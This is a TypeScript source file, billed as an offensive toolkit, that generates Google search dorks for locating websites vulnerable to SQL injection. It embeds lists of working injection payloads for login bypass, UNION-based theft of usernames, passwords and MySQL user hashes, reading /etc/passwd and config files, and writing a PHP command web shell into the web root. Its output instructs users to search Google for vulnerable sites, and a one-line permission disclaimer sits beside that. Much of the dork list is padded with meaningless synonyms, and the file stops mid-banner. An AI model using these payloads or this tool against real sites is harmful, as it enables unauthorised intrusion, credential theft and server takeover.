/**
 * SQLi Dorks Generator Pro - WHOAMISec Offensive Toolkit
 * Generate Google dorks for SQL injection vulnerabilities
 * TypeScript/Node.js Implementation
 */

import * as fs from 'fs';

interface DorkCategory {
  name: string;
  patterns: string[];
}

interface DorkResult {
  keyword: string;
  dorks: string[];
  count: number;
  categories: string[];
}

class SQLiDorksGenerator {
  private dorkCategories: DorkCategory[] = [
    {
      name: "Login Bypass",
      patterns: [
        "' OR '1'='1",
        "' OR 1=1--",
        "' OR 1=1#",
        "' OR 1=1/*",
        "admin'--",
        "admin' #",
        "admin'/*",
        "' or 1=1--",
        "' or 1=1#",
        "' or 1=1/*",
        "') or '1'='1--",
        "') or ('1'='1--"
      ]
    },
    {
      name: "Union Injection",
      patterns: [
        "' UNION SELECT NULL--",
        "' UNION SELECT NULL,NULL--",
        "' UNION SELECT NULL,NULL,NULL--",
        "' UNION SELECT 1,2,3--",
        "' UNION SELECT 1,2,3,4--",
        "' UNION SELECT @@version--",
        "' UNION SELECT user(),database()--",
        "' UNION SELECT table_name FROM information_schema.tables--",
        "' UNION SELECT column_name FROM information_schema.columns--",
        "' UNION SELECT username,password FROM users--"
      ]
    },
    {
      name: "Error Based",
      patterns: [
        "' AND 1=CONVERT(int, (SELECT @@version))--",
        "' AND 1=CAST((SELECT table_name FROM information_schema.tables LIMIT 1) AS int)--",
        "' AND EXTRACTVALUE(1, CONCAT(0x5c, (SELECT @@version)))--",
        "' AND UPDATEXML(1, CONCAT(0x5c, (SELECT @@version)), 1)--",
        "' OR 1=1 AND 1337=1337--",
        "' HAVING 1=1--",
        "' GROUP BY column_having_unknown_column--"
      ]
    },
    {
      name: "Blind Injection",
      patterns: [
        "' AND 1=1--",
        "' AND 1=2--",
        "' AND LENGTH(database())>1--",
        "' AND SUBSTRING(@@version,1,1)='5'--",
        "' AND ASCII(SUBSTRING(database(),1,1))>64--",
        "' AND IF(1=1, SLEEP(5), 0)--",
        "' AND IF(SUBSTRING(@@version,1,1)='5', SLEEP(5), 0)--",
        "' OR IF(1=1, SLEEP(5), 0)--"
      ]
    },
    {
      name: "File Access",
      patterns: [
        "' UNION SELECT LOAD_FILE('/etc/passwd')--",
        "' UNION SELECT LOAD_FILE('C:/boot.ini')--",
        "' UNION SELECT LOAD_FILE('/var/www/html/config.php')--",
        "' UNION SELECT " + "0x3c3f70687020706870696e666f28293b203f3e INTO DUMPFILE '/tmp/shell.php'--",
        "' UNION SELECT " + "'<?php system($_GET[\"cmd\"]); ?>' INTO OUTFILE '/var/www/html/shell.php'--"
      ]
    },
    {
      name: "Database Enumeration",
      patterns: [
        "' UNION SELECT schema_name FROM information_schema.schemata--",
        "' UNION SELECT table_name FROM information_schema.tables WHERE table_schema=database()--",
        "' UNION SELECT column_name FROM information_schema.columns WHERE table_name='users'--",
        "' UNION SELECT username,password FROM users--",
        "' UNION SELECT user,password FROM mysql.user--",
        "' UNION SELECT table_name,column_name FROM information_schema.columns--"
      ]
    },
    {
      name: "Advanced Bypass",
      patterns: [
        "'/**/OR/**/1=1--",
        "'/*!50000OR*/1=1--",
        "' OR 1=1#",
        "' OR 'x'='x",
        "' OR 1=1--",
        "' OR 1=1#",
        "' OR 1=1/*",
        "' OR 1=1;%00",
        "' OR 1=1 AND 1=1--",
        "' OR '1'='1' AND 1=1--"
      ]
    }
  ];

  private baseDorks: string[] = [
    "inurl:admin.php",
    "inurl:login.php",
    "inurl:config.php",
    "inurl:db.php",
    "inurl:mysql.php",
    "inurl:database.php",
    "inurl:setup.php",
    "inurl:install.php",
    "inurl:phpmyadmin",
    "inurl:wp-admin",
    "inurl:joomla",
    "inurl:drupal",
    "inurl:magento",
    "inurl:prestashop",
    "inurl:opencart",
    "inurl:phpbb",
    "inurl:vbulletin",
    "inurl:smf",
    "inurl:mybb",
    "inurl:fluxbb",
    "inurl:login",
    "inurl:signin",
    "inurl:auth",
    "inurl:authenticate",
    "inurl:verify",
    "inurl:check",
    "inurl:validate",
    "inurl:confirm",
    "inurl:submit",
    "inurl:process",
    "inurl:action",
    "inurl:do",
    "inurl:go",
    "inurl:redirect",
    "inurl:return",
    "inurl:callback",
    "inurl:response",
    "inurl:reply",
    "inurl:result",
    "inurl:output",
    "inurl:data",
    "inurl:info",
    "inurl:details",
    "inurl:show",
    "inurl:display",
    "inurl:view",
    "inurl:get",
    "inurl:fetch",
    "inurl:retrieve",
    "inurl:select",
    "inurl:search",
    "inurl:find",
    "inurl:lookup",
    "inurl:query",
    "inurl:ask",
    "inurl:request",
    "inurl:send",
    "inurl:post",
    "inurl:get",
    "inurl:put",
    "inurl:delete",
    "inurl:update",
    "inurl:edit",
    "inurl:modify",
    "inurl:change",
    "inurl:add",
    "inurl:create",
    "inurl:new",
    "inurl:insert",
    "inurl:save",
    "inurl:store",
    "inurl:upload",
    "inurl:download",
    "inurl:import",
    "inurl:export",
    "inurl:backup",
    "inurl:restore",
    "inurl:sync",
    "inurl:connect",
    "inurl:link",
    "inurl:join",
    "inurl:merge",
    "inurl:combine",
    "inurl:integrate",
    "inurl:api",
    "inurl:rest",
    "inurl:json",
    "inurl:xml",
    "inurl:ajax",
    "inurl:jquery",
    "inurl:javascript",
    "inurl:js",
    "inurl:css",
    "inurl:style",
    "inurl:theme",
    "inurl:template",
    "inurl:layout",
    "inurl:design",
    "inurl:skin",
    "inurl:appearance",
    "inurl:look",
    "inurl:feel",
    "inurl:interface",
    "inurl:ui",
    "inurl:ux",
    "inurl:frontend",
    "inurl:backend",
    "inurl:server",
    "inurl:client",
    "inurl:database",
    "inurl:db",
    "inurl:sql",
    "inurl:mysql",
    "inurl:postgresql",
    "inurl:oracle",
    "inurl:mssql",
    "inurl:sqlite",
    "inurl:mongodb",
    "inurl:nosql",
    "inurl:redis",
    "inurl:memcached",
    "inurl:cache",
    "inurl:session",
    "inurl:cookie",
    "inurl:token",
    "inurl:auth",
    "inurl:permission",
    "inurl:role",
    "inurl:user",
    "inurl:member",
    "inurl:customer",
    "inurl:client",
    "inurl:guest",
    "inurl:visitor",
    "inurl:subscriber",
    "inurl:registered",
    "inurl:logged",
    "inurl:authenticated",
    "inurl:authorized",
    "inurl:verified",
    "inurl:confirmed",
    "inurl:validated",
    "inurl:checked",
    "inurl:approved",
    "inurl:accepted",
    "inurl:allowed",
    "inurl:permitted",
    "inurl:enabled",
    "inurl:active",
    "inurl:online",
    "inurl:connected",
    "inurl:available",
    "inurl:accessible",
    "inurl:reachable",
    "inurl:visible",
    "inurl:public",
    "inurl:private",
    "inurl:secure",
    "inurl:protected",
    "inurl:encrypted",
    "inurl:safe",
    "inurl:dangerous",
    "inurl:risky",
    "inurl:vulnerable",
    "inurl:exposed",
    "inurl:leaked",
    "inurl:compromised",
    "inurl:hacked",
    "inurl:breached",
    "inurl:attacked",
    "inurl:infected",
    "inurl:malware",
    "inurl:virus",
    "inurl:trojan",
    "inurl:backdoor",
    "inurl:shell",
    "inurl:exploit",
    "inurl:payload",
    "inurl:attack",
    "inurl:hack",
    "inurl:crack",
    "inurl:break",
    "inurl:penetrate",
    "inurl:intrude",
    "inurl:infiltrate",
    "inurl:breach",
    "inurl:violate",
    "inurl:compromise",
    "inurl:corrupt",
    "inurl:damage",
    "inurl:destroy",
    "inurl:delete",
    "inurl:remove",
    "inurl:erase",
    "inurl:wipe",
    "inurl:clean",
    "inurl:clear",
    "inurl:reset",
    "inurl:restore",
    "inurl:backup",
    "inurl:save",
    "inurl:protect",
    "inurl:secure",
    "inurl:defend",
    "inurl:guard",
    "inurl:shield",
    "inurl:block",
    "inurl:prevent",
    "inurl:stop",
    "inurl:halt",
    "inurl:terminate",
    "inurl:kill",
    "inurl:destroy",
    "inurl:delete",
    "inurl:remove",
    "inurl:disable",
    "inurl:deactivate",
    "inurl:turnoff",
    "inurl:shutdown",
    "inurl:poweroff",
    "inurl:restart",
    "inurl:reboot",
    "inurl:refresh",
    "inurl:reload",
    "inurl:update",
    "inurl:upgrade",
    "inurl:patch",
    "inurl:fix",
    "inurl:repair",
    "inurl:maintain",
    "inurl:service",
    "inurl:support",
    "inurl:help",
    "inurl:assist",
    "inurl:guide",
    "inurl:tutorial",
    "inurl:manual",
    "inurl:documentation",
    "inurl:docs",
    "inurl:wiki",
    "inurl:faq",
    "inurl:forum",
    "inurl:community",
    "inurl:blog",
    "inurl:news",
    "inurl:announcement",
    "inurl:notification",
    "inurl:alert",
    "inurl:warning",
    "inurl:error",
    "inurl:exception",
    "inurl:bug",
    "inurl:issue",
    "inurl:problem",
    "inurl:trouble",
    "inurl:difficulty",
    "inurl:challenge",
    "inurl:obstacle",
    "inurl:barrier",
    "inurl:limitation",
    "inurl:restriction",
    "inurl:constraint",
    "inurl:rule",
    "inurl:policy",
    "inurl:term",
    "inurl:condition",
    "inurl:requirement",
    "inurl:prerequisite",
    "inurl:dependency",
    "inurl:relation",
    "inurl:connection",
    "inurl:link",
    "inurl:association",
    "inurl:affiliation",
    "inurl:membership",
    "inurl:subscription",
    "inurl:registration",
    "inurl:enrollment",
    "inurl:signup",
    "inurl:join",
    "inurl:participate",
    "inurl:engage",
    "inurl:interact",
    "inurl:communicate",
    "inurl:connect",
    "inurl:share",
    "inurl:exchange",
    "inurl:transfer",
    "inurl:send",
    "inurl:receive",
    "inurl:upload",
    "inurl:download",
    "inurl:import",
    "inurl:export",
    "inurl:synchronize",
    "inurl:sync",
    "inurl:backup",
    "inurl:restore",
    "inurl:archive",
    "inurl:compress",
    "inurl:decompress",
    "inurl:zip",
    "inurl:unzip",
    "inurl:encrypt",
    "inurl:decrypt",
    "inurl:encode",
    "inurl:decode",
    "inurl:hash",
    "inurl:checksum",
    "inurl:validate",
    "inurl:verify",
    "inurl:authenticate",
    "inurl:authorize",
    "inurl:permit",
    "inurl:allow",
    "inurl:deny",
    "inurl:block",
    "inurl:restrict",
    "inurl:limit",
    "inurl:control",
    "inurl:manage",
    "inurl:administer",
    "inurl:moderate",
    "inurl:monitor",
    "inurl:watch",
    "inurl:observe",
    "inurl:track",
    "inurl:trace",
    "inurl:follow",
    "inurl:log",
    "inurl:record",
    "inurl:history",
    "inurl:audit",
    "inurl:report",
    "inurl:analyze",
    "inurl:statistics",
    "inurl:stats",
    "inurl:metrics",
    "inurl:analytics",
    "inurl:performance",
    "inurl:benchmark",
    "inurl:test",
    "inurl:check",
    "inurl:verify",
    "inurl:validate",
    "inurl:confirm",
    "inurl:ensure",
    "inurl:guarantee",
    "inurl:warranty",
    "inurl:assurance",
    "inurl:insurance",
    "inurl:protection",
    "inurl:security",
    "inurl:safety",
    "inurl:privacy",
    "inurl:confidentiality",
    "inurl:secrecy",
    "inurl:disclosure",
    "inurl:transparency",
    "inurl:visibility",
    "inurl:accessibility",
    "inurl:availability",
    "inurl:reliability",
    "inurl:stability",
    "inurl:consistency",
    "inurl:accuracy",
    "inurl:precision",
    "inurl:correctness",
    "inurl:validity",
    "inurl:integrity",
    "inurl:completeness",
    "inurl:totality",
    "inurl:entirety",
    "inurl:wholeness",
    "inurl:fullness",
    "inurl:entire",
    "inurl:complete",
    "inurl:total",
    "inurl:whole",
    "inurl:full",
    "inurl:entire",
    "inurl:absolute",
    "inurl:total",
    "inurl:complete",
    "inurl:perfect",
    "inurl:ideal",
    "inurl:optimal",
    "inurl:best",
    "inurl:maximum",
    "inurl:minimum",
    "inurl:peak",
    "inurl:top",
    "inurl:highest",
    "inurl:lowest",
    "inurl:extreme",
    "inurl:ultimate",
    "inurl:final",
    "inurl:last",
    "inurl:end",
    "inurl:finish",
    "inurl:complete",
    "inurl:close",
    "inurl:terminate",
    "inurl:stop",
    "inurl:end",
    "inurl:cease",
    "inurl:halt",
    "inurl:discontinue",
    "inurl:abandon",
    "inurl:quit",
    "inurl:exit",
    "inurl:leave",
    "inurl:depart",
    "inurl:go",
    "inurl:move",
    "inurl:travel",
    "inurl:journey",
    "inurl:voyage",
    "inurl:trip",
    "inurl:excursion",
    "inurl:tour",
    "inurl:visit",
    "inurl:explore",
    "inurl:discover",
    "inurl:find",
    "inurl:locate",
    "inurl:position",
    "inurl:place",
    "inurl:spot",
    "inurl:site",
    "inurl:location",
    "inurl:area",
    "inurl:region",
    "inurl:zone",
    "inurl:territory",
    "inurl:domain",
    "inurl:realm",
    "inurl:sphere",
    "inurl:field",
    "inurl:sector",
    "inurl:industry",
    "inurl:business",
    "inurl:commerce",
    "inurl:trade",
    "inurl:market",
    "inurl:store",
    "inurl:shop",
    "inurl:retail",
    "inurl:wholesale",
    "inurl:distribution",
    "inurl:supply",
    "inurl:chain",
    "inurl:network",
    "inurl:system",
    "inurl:infrastructure",
    "inurl:framework",
    "inurl:structure",
    "inurl:architecture",
    "inurl:design",
    "inurl:plan",
    "inurl:scheme",
    "inurl:strategy",
    "inurl:approach",
    "inurl:method",
    "inurl:technique",
    "inurl:procedure",
    "inurl:process",
    "inurl:operation",
    "inurl:function",
    "inurl:feature",
    "inurl:capability",
    "inurl:ability",
    "inurl:skill",
    "inurl:talent",
    "inurl:gift",
    "inurl:capacity",
    "inurl:potential",
    "inurl:power",
    "inurl:force",
    "inurl:strength",
    "inurl:might",
    "inurl:energy",
    "inurl:vigor",
    "inurl:vitality",
    "inurl:life",
    "inurl:existence",
    "inurl:being",
    "inurl:entity",
    "inurl:object",
    "inurl:item",
    "inurl:thing",
    "inurl:stuff",
    "inurl:material",
    "inurl:substance",
    "inurl:matter",
    "inurl:content",
    "inurl:data",
    "inurl:information",
    "inurl:knowledge",
    "inurl:wisdom",
    "inurl:understanding",
    "inurl:comprehension",
    "inurl:grasp",
    "inurl:mastery",
    "inurl:expertise",
    "inurl:proficiency",
    "inurl:competence",
    "inurl:efficiency",
    "inurl:effectiveness",
    "inurl:success",
    "inurl:achievement",
    "inurl:accomplishment",
    "inurl:attainment",
    "inurl:realization",
    "inurl:fulfillment",
    "inurl:satisfaction",
    "inurl:contentment",
    "inurl:happiness",
    "inurl:joy",
    "inurl:pleasure",
    "inurl:delight",
    "inurl:bliss",
    "inurl:ecstasy",
    "inurl:euphoria",
    "inurl:elation",
    "inurl:excitement",
    "inurl:thrill",
    "inurl:adventure",
    "inurl:experience",
    "inurl:event",
    "inurl:occurrence",
    "inurl:incident",
    "inurl:episode",
    "inurl:affair",
    "inurl:matter",
    "inurl:business",
    "inurl:concern",
    "inurl:interest",
    "inurl:hobby",
    "inurl:pastime",
    "inurl:activity",
    "inurl:action",
    "inurl:deed",
    "inurl:act",
    "inurl:feat",
    "inurl:exploit",
    "inurl:stunt",
    "inurl:trick",
    "inurl:prank",
    "inurl:joke",
    "inurl:fun",
    "inurl:amusement",
    "inurl:entertainment",
    "inurl:recreation",
    "inurl:leisure",
    "inurl:relaxation",
    "inurl:rest",
    "inurl:peace",
    "inurl:calm",
    "inurl:quiet",
    "inurl:silence",
    "inurl:stillness",
    "inurl:tranquility",
    "inurl:serenity",
    "inurl:harmony",
    "inurl:balance",
    "inurl:equilibrium",
    "inurl:stability",
    "inurl:steadiness",
    "inurl:firmness",
    "inurl:solid",
    "inurl:strong",
    "inurl:powerful",
    "inurl:mighty",
    "inurl:forceful",
    "inurl:intense",
    "inurl:extreme",
    "inurl:severe",
    "inurl:harsh",
    "inurl:rough",
    "inurl:tough",
    "inurl:hard",
    "inurl:difficult",
    "inurl:challenging",
    "inurl:demanding",
    "inurl:taxing",
    "inurl:burdensome",
    "inurl:heavy",
    "inurl:weighty",
    "inurl:massive",
    "inurl:huge",
    "inurl:enormous",
    "inurl:gigantic",
    "inurl:colossal",
    "inurl:tremendous",
    "inurl:immense",
    "inurl:vast",
    "inurl:great",
    "inurl:large",
    "inurl:big",
    "inurl:sizable",
    "inurl:substantial",
    "inurl:considerable",
    "inurl:significant",
    "inurl:important",
    "inurl:crucial",
    "inurl:critical",
    "inurl:vital",
    "inurl:essential",
    "inurl:necessary",
    "inurl:required",
    "inurl:needed",
    "inurl:wanted",
    "inurl:desired",
    "inurl:wished",
    "inurl:hoped",
    "inurl:expected",
    "inurl:anticipated",
    "inurl:predicted",
    "inurl:foreseen",
    "inurl:planned",
    "inurl:intended",
    "inurl:meant",
    "inurl:designed",
    "inurl:aimed",
    "inurl:targeted",
    "inurl:focused",
    "inurl:concentrated",
    "inurl:centered",
    "inurl:directed",
    "inurl:guided",
    "inurl:led",
    "inurl:driven",
    "inurl:motivated",
    "inurl:inspired",
    "inurl:encouraged",
    "inurl:supported",
    "inurl:backed",
    "inurl:promoted",
    "inurl:advanced",
    "inurl:progressed",
    "inurl:developed",
    "inurl:evolved",
    "inurl:grown",
    "inurl:improved",
    "inurl:enhanced",
    "inurl:upgraded",
    "inurl:refined",
    "inurl:perfected",
    "inurl:optimized",
    "inurl:maximized",
    "inurl:minimized"
  ];

  private sqlKeywords: string[] = [
    "SELECT", "INSERT", "UPDATE", "DELETE", "DROP", "CREATE", "ALTER", "TRUNCATE",
    "UNION", "JOIN", "WHERE", "FROM", "TABLE", "DATABASE", "SCHEMA", "COLUMN",
    "INDEX", "VIEW", "PROCEDURE", "FUNCTION", "TRIGGER", "CONSTRAINT", "PRIMARY",
    "FOREIGN", "KEY", "REFERENCES", "CASCADE", "RESTRICT", "SET", "NULL", "NOT",
    "DEFAULT", "AUTO_INCREMENT", "IDENTITY", "UNIQUE", "CHECK", "EXISTS", "IN",
    "BETWEEN", "LIKE", "AS", "OR", "AND", "NOT", "IS", "NULL", "TRUE", "FALSE",
    "ORDER", "BY", "GROUP", "HAVING", "LIMIT", "OFFSET", "FETCH", "TOP", "DISTINCT",
    "ALL", "ANY", "SOME", "EXISTS", "CASE", "WHEN", "THEN", "ELSE", "END", "IF",
    "WHILE", "FOR", "LOOP", "DECLARE", "BEGIN", "COMMIT", "ROLLBACK", "SAVEPOINT",
    "TRANSACTION", "LOCK", "UNLOCK", "GRANT", "REVOKE", "PRIVILEGE", "ROLE",
    "USER", "SESSION", "CONNECTION", "POOL", "CLUSTER", "NODE", "SHARD",
    "PARTITION", "SEGMENT", "EXTENT", "BLOCK", "PAGE", "ROW", "RECORD", "TUPLE",
    "FIELD", "ATTRIBUTE", "PROPERTY", "VALUE", "DATA", "TYPE", "VARCHAR", "CHAR",
    "TEXT", "INT", "INTEGER", "BIGINT", "SMALLINT", "TINYINT", "DECIMAL", "NUMERIC",
    "FLOAT", "REAL", "DOUBLE", "BOOLEAN", "DATE", "TIME", "TIMESTAMP", "DATETIME",
    "YEAR", "MONTH", "DAY", "HOUR", "MINUTE", "SECOND", "MILLISECOND", "MICROSECOND",
    "ZONE", "INTERVAL", "PERIOD", "DURATION", "LENGTH", "SIZE", "COUNT", "SUM",
    "AVG", "AVERAGE", "MIN", "MAX", "TOTAL", "ABSOLUTE", "ROUND", "CEILING", "FLOOR",
    "MOD", "MODULO", "POWER", "SQRT", "SQUARE", "EXP", "LOG", "LN", "SIN", "COS",
    "TAN", "COT", "ASIN", "ACOS", "ATAN", "ATAN2", "DEGREES", "RADIANS", "PI",
    "RANDOM", "RAND", "UUID", "GUID", "IDENTITY", "SEQUENCE", "NEXT", "CURR",
    "VAL", "LAST", "INSERT_ID", "ROW_COUNT", "FOUND_ROWS", "AFFECTED_ROWS",
    "CONNECTION_ID", "USER", "CURRENT_USER", "SESSION_USER", "SYSTEM_USER",
    "DATABASE", "SCHEMA", "VERSION", "NOW", "CURRENT_TIMESTAMP", "LOCALTIME",
    "LOCALTIMESTAMP", "UNIX_TIMESTAMP", "FROM_UNIXTIME", "UTC_DATE", "UTC_TIME",
    "UTC_TIMESTAMP", "MONTH", "MONTHNAME", "DAYNAME", "DAYOFWEEK", "DAYOFMONTH",
    "DAYOFYEAR", "WEEK", "WEEKDAY", "WEEKOFYEAR", "YEARWEEK", "QUARTER", "HOUR",
    "MINUTE", "SECOND", "MICROSECOND", "LAST_DAY", "MAKEDATE", "MAKETIME",
    "PERIOD_ADD", "PERIOD_DIFF", "DATE_ADD", "DATE_SUB", "ADDDATE", "SUBDATE",
    "ADDTIME", "SUBTIME", "DATEDIFF", "TIMEDIFF", "STR_TO_DATE", "DATE_FORMAT",
    "TIME_FORMAT", "GET_FORMAT", "CONV", "BIN", "OCT", "HEX", "ASCII", "CHAR",
    "CHAR_LENGTH", "CHARACTER_LENGTH", "LENGTH", "BIT_LENGTH", "LOWER", "LCASE",
    "UPPER", "UCASE", "LOAD_FILE", "MATCH", "AGAINST", "FULLTEXT", "BOOLEAN",
    "MODE", "NATURAL", "LANGUAGE", "QUERY", "EXPANSION", "STRCMP", "SOUNDS",
    "LIKE", "REGEXP", "RLIKE", "INSTR", "LOCATE", "POSITION", "SUBSTRING",
    "SUBSTR", "MID", "LEFT", "RIGHT", "CONCAT", "CONCAT_WS", "INSERT", "REPLACE",
    "REVERSE", "ELT", "FIELD", "FIND_IN_SET", "MAKE_SET", "EXPORT_SET", "LCASE",
    "LOWER", "UCASE", "UPPER", "LOAD_FILE", "MATCH", "AGAINST", "FULLTEXT",
    "BOOLEAN", "MODE", "NATURAL", "LANGUAGE", "QUERY", "EXPANSION", "STRCMP",
    "SOUNDS", "LIKE", "REGEXP", "RLIKE", "INSTR", "LOCATE", "POSITION",
    "SUBSTRING", "SUBSTR", "MID", "LEFT", "RIGHT", "CONCAT", "CONCAT_WS",
    "INSERT", "REPLACE", "REVERSE", "ELT", "FIELD", "FIND_IN_SET", "MAKE_SET",
    "EXPORT_SET", "LCASE", "LOWER", "UCASE", "UPPER"
  ];

  private fileExtensions: string[] = [
    ".php", ".asp", ".aspx", ".jsp", ".cgi", ".pl", ".py", ".rb", ".js", ".ts",
    ".sql", ".db", ".mdb", ".accdb", ".sqlite", ".sqlite3", ".db3", ".dbf",
    ".xml", ".json", ".csv", ".txt", ".log", ".bak", ".old", ".backup",
    ".temp", ".tmp", ".cache", ".session", ".config", ".conf", ".ini",
    ".properties", ".env", ".settings", ".prefs", ".dat", ".data", ".bin"
  ];

  private vulnerableParameters: string[] = [
    "id", "user", "username", "email", "mail", "name", "first", "last", "full",
    "password", "pass", "pwd", "login", "log", "auth", "token", "key", "code",
    "pin", "secret", "private", "public", "session", "sess", "sid", "uid",
    "gid", "pid", "tid", "cid", "bid", "aid", "eid", "fid", "kid", "lid",
    "mid", "nid", "oid", "qid", "rid", "vid", "wid", "xid", "yid", "zid",
    "page", "pg", "p", "num", "number", "no", "n", "count", "cnt", "total",
    "sum", "amount", "amt", "qty", "quantity", "size", "sz", "length", "len",
    "width", "w", "height", "h", "depth", "d", "weight", "wt", "mass", "m",
    "volume", "vol", "area", "a", "perimeter", "peri", "radius", "r", "diameter",
    "dia", "circumference", "circ", "angle", "ang", "degree", "deg", "radian",
    "rad", "temperature", "temp", "t", "pressure", "press", "p", "force", "f",
    "energy", "e", "power", "pow"
  ];

  private generateBasicDorks(keyword: string): string[] {
    const dorks: string[] = [];
    
    // Basic SQL injection patterns
    for (const pattern of this.dorkCategories[0].patterns) {
      dorks.push(`${keyword} ${pattern}`);
      dorks.push(`${keyword}"${pattern}"`);
      dorks.push(`${keyword}'${pattern}'`);
    }
    
    return dorks;
  }

  private generateAdvancedDorks(keyword: string): string[] {
    const dorks: string[] = [];
    
    // Generate dorks for each category
    for (const category of this.dorkCategories) {
      for (const pattern of category.patterns) {
        // Basic injection
        dorks.push(`${keyword} ${pattern}`);
        dorks.push(`${keyword}"${pattern}"`);
        dorks.push(`${keyword}'${pattern}'`);
        
        // URL-based injection
        dorks.push(`inurl:${keyword} ${pattern}`);
        dorks.push(`inurl:${keyword}"${pattern}"`);
        dorks.push(`inurl:${keyword}'${pattern}'`);
        
        // File extension based
        for (const ext of this.fileExtensions) {
          dorks.push(`${keyword} ${pattern} ${ext}`);
          dorks.push(`inurl:${keyword} ${pattern} ${ext}`);
        }
        
        // Parameter based
        for (const param of this.vulnerableParameters) {
          dorks.push(`${keyword} inurl:${param}= ${pattern}`);
          dorks.push(`${keyword} inurl:${param} ${pattern}`);
        }
      }
    }
    
    return dorks;
  }

  private generateGoogleDorks(keyword: string): string[] {
    const dorks: string[] = [];
    
    // Google-specific dorks
    const googleOperators = [
      "site:", "inurl:", "intitle:", "intext:", "filetype:", "cache:",
      "related:", "link:", "info:", "define:", "weather:", "stocks:",
      "map:", "movie:", "music:", "book:", "phonebook:", "rphonebook:",
      "bphonebook:", "author:", "group:", "insubject:", "msgid:",
      "body:", "subject:", "newsgroups:", "profile:", "location:",
      "before:", "after:", "around:", "near:", "within:", "contains:"
    ];
    
    for (const operator of googleOperators) {
      for (const pattern of this.dorkCategories[0].patterns) {
        dorks.push(`${operator}${keyword} ${pattern}`);
        dorks.push(`${keyword} ${operator}${pattern}`);
      }
    }
    
    return dorks;
  }

  private generateCustomDorks(keyword: string): string[] {
    const dorks: string[] = [];
    
    // Custom combinations
    const combinations = [
      `${keyword} "SQL injection"`,
      `${keyword} "vulnerable to SQL"`,
      `${keyword} "exploit SQL"`,
      `${keyword} "bypass authentication"`,
      `${keyword} "union select"`,
      `${keyword} "information_schema"`,
      `${keyword} "mysql.user"`,
      `${keyword} "load_file"`,
      `${keyword} "into outfile"`,
      `${keyword} "into dumpfile"`,
      `${keyword} "sleep("`,
      `${keyword} "benchmark("`,
      `${keyword} "pg_sleep("`,
      `${keyword} "waitfor delay"`,
      `${keyword} "dbms_pipe.receive_message"`,
      `${keyword} "sysdate"`,
      `${keyword} "now()"`,
      `${keyword} "current_timestamp"`,
      `${keyword} "@@version"`,
      `${keyword} "version()"`,
      `${keyword} "database()"`,
      `${keyword} "schema()"`,
      `${keyword} "user()"`,
      `${keyword} "current_user"`,
      `${keyword} "session_user"`,
      `${keyword} "system_user"`,
      `${keyword} "concat("`,
      `${keyword} "group_concat("`,
      `${keyword} "string_agg("`,
      `${keyword} "array_agg("`,
      `${keyword} "count("`,
      `${keyword} "sum("`,
      `${keyword} "avg("`,
      `${keyword} "min("`,
      `${keyword} "max("`,
      `${keyword} "length("`,
      `${keyword} "char_length("`,
      `${keyword} "substring("`,
      `${keyword} "substr("`,
      `${keyword} "mid("`,
      `${keyword} "left("`,
      `${keyword} "right("`,
      `${keyword} "replace("`,
      `${keyword} "reverse("`,
      `${keyword} "trim("`,
      `${keyword} "ltrim("`,
      `${keyword} "rtrim("`,
      `${keyword} "upper("`,
      `${keyword} "lower("`,
      `${keyword} "ucase("`,
      `${keyword} "lcase("`,
      `${keyword} "hex("`,
      `${keyword} "unhex("`,
      `${keyword} "ascii("`,
      `${keyword} "char("`,
      `${keyword} "ord("`,
      `${keyword} "cast("`,
      `${keyword} "convert("`,
      `${keyword} "if("`,
      `${keyword} "case"`,
      `${keyword} "when"`,
      `${keyword} "then"`,
      `${keyword} "else"`,
      `${keyword} "end"`
    ];
    
    return combinations;
  }

  public generateDorks(keyword: string, count: number = 50): DorkResult {
    const allDorks: string[] = [];
    const categories: string[] = [];
    
    console.log(`[+] Generating SQL injection dorks for keyword: ${keyword}`);
    console.log(`[+] Target count: ${count}`);
    
    // Generate basic dorks
    const basicDorks = this.generateBasicDorks(keyword);
    allDorks.push(...basicDorks);
    categories.push("Basic Injection");
    console.log(`[+] Generated ${basicDorks.length} basic dorks`);
    
    // Generate advanced dorks
    const advancedDorks = this.generateAdvancedDorks(keyword);
    allDorks.push(...advancedDorks);
    categories.push("Advanced Injection");
    console.log(`[+] Generated ${advancedDorks.length} advanced dorks`);
    
    // Generate Google-specific dorks
    const googleDorks = this.generateGoogleDorks(keyword);
    allDorks.push(...googleDorks);
    categories.push("Google Operators");
    console.log(`[+] Generated ${googleDorks.length} Google dorks`);
    
    // Generate custom dorks
    const customDorks = this.generateCustomDorks(keyword);
    allDorks.push(...customDorks);
    categories.push("Custom Combinations");
    console.log(`[+] Generated ${customDorks.length} custom dorks`);
    
    // Remove duplicates and shuffle
    const uniqueDorks = [...new Set(allDorks)];
    const shuffled = uniqueDorks.sort(() => Math.random() - 0.5);
    
    // Limit to requested count
    const finalDorks = shuffled.slice(0, count);
    
    console.log(`[+] Total unique dorks generated: ${uniqueDorks.length}`);
    console.log(`[+] Final dorks count: ${finalDorks.length}`);
    
    return {
      keyword,
      dorks: finalDorks,
      count: finalDorks.length,
      categories: [...new Set(categories)]
    };
  }

  public async saveDorks(dorks: DorkResult, outputFile: string): Promise<void> {
    try {
      const content = `# SQL Injection Dorks Generator Results
# Generated: ${new Date().toISOString()}
# Keyword: ${dorks.keyword}
# Total Dorks: ${dorks.count}
# Categories: ${dorks.categories.join(', ')}

${dorks.dorks.map((dork, index) => `${index + 1}. ${dork}`).join('\n')}

# Usage Instructions:
# Copy and paste these dorks into Google search
# Look for vulnerable websites with SQL injection points
# Always test responsibly and with permission
# Use for educational and authorized testing purposes only
`;
      
      fs.writeFileSync(outputFile, content, 'utf-8');
      console.log(`[+] Dorks saved to: ${outputFile}`);
    } catch (error) {
      console.error(`[!] Failed to save dorks:`, error instanceof Error ? error.message : 'Unknown error');
      throw error;
    }
  }

  public printBanner(): void {
    console.log(`
╔═══════════════════════════════════════════════════════════════════════════════════════╗
║  ✋✋✋ SQLI DORKS GENERATOR PRO - WHOAMISEC OFFENSIVE ✋✋✋                            ║
║  █     █░▓█████  ██▀███   ███▄ ▄███▓▓█████  ██▓███   ▄▄▄█████▓░██████╗ ██╗          ║
║  ▓█░ █ ░█░▓█   ▀ ▓██ ▒ ██▒▓██▒▀█▀ ██▒▓█   ▀ ▓██░  ██▒▓  ██▒ ▓▒▒██    ▒ ▒██║          ║
║  ▒█░ █ ░█ ▒███   ▓██ ░▄█ ▒▓██    ▓██░▒███   ▓██░ ██▓▒▒ ▓██░ ▒░░ ▓██▄   ░██║          ║
║  ░█░ █ ░█ ▒▓█  ▄ ▒██▀▀█▄  ▒██    ▒██ ▒▓█  ▄ ▒██▄█▓▒ ▒░ ▓██▓ ░   ▒   ██▒░██║          ║
